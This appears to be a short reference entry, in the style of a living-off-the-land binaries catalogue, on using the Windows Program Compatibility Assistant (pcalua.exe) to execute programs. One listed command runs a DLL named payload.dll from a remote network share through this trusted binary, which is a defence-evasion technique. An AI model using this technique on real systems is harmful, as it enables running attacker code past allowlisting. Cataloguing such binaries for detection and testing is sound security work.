## Pcalua.exe
* Functions: Execute
```

pcalua.exe -a calc.exe
Open the target .EXE using the Program Compatibility Assistant.

pcalua.exe -a \\server\payload.dll
Open the target .DLL file with the Program Compatibilty Assistant.

pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
Open the target .CPL file with the Program Compatibility Assistant.
```
   
* Resources:   
  * https://twitter.com/KyleHanslovan/status/912659279806640128
   
* Full path:   
  * c:\windows\system32\pcalua.exe
   
* Notes: Thanks to:
fab - @0rbz_
Kyle Hanslovan - @KyleHanslovan
  
   
